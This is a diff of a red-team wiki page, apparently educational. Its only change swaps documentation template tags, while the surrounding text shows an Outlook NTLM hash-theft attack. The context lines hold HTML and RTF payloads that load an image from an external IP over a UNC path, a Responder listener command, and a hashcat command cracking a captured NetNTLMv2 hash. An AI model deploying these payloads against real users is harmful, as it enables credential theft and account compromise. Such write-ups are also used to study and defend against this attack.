@@ -12,26 +12,26 @@ Note that this attack does not work on the most up to date version of Windows 10
 
 Let's create a new HTML file with the below:
 
-{% code-tabs %}
-{% code-tabs-item title="message.html" %}
+{% tabs %}
+{% tab title="message.html" %}
 ```markup
 <html>
     <h1>holla good sir</h1>
     <img src="file://157.230.60.143/download.jpg">
 </html>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 An RTF file also works:
 
-{% code-tabs %}
-{% code-tabs-item title="message.rtf" %}
+{% tabs %}
+{% tab title="message.rtf" %}
 ```javascript
 {\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://157.230.60.143/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Then insert a new file by clicking the attachment icon at the top on the window title bar:
 
@@ -49,13 +49,13 @@ You should see that your message now looks like an HTML with a broken image \(ex
 
 Fire up `Responder` to listen for incoming SMB authentication requests from the victim
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 responder -I eth1 -v
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ..and send the malicious email to the victim.
 
@@ -67,13 +67,13 @@ Once the victim opens their Outlook and clicks on the malicious email to preview
 
 Once the hash is stolen, we can attempt cracking it:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 hashcat -m5600 'spotless::OFFENSE:6bdb56c8140cf8dc:FFEF94D55C2EB2DE8CF13F140687AD7A:0101000000000000A5A01FB2BE9ED401114D47C1916811640000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000200000407D7D30819F03909981529F6ACA84502CFCC8B3555DBA34316F8914973DD03C0A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0030002E0035000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 In this case, we can see the user had a ridiculously simple password, which got cracked immediately:
 
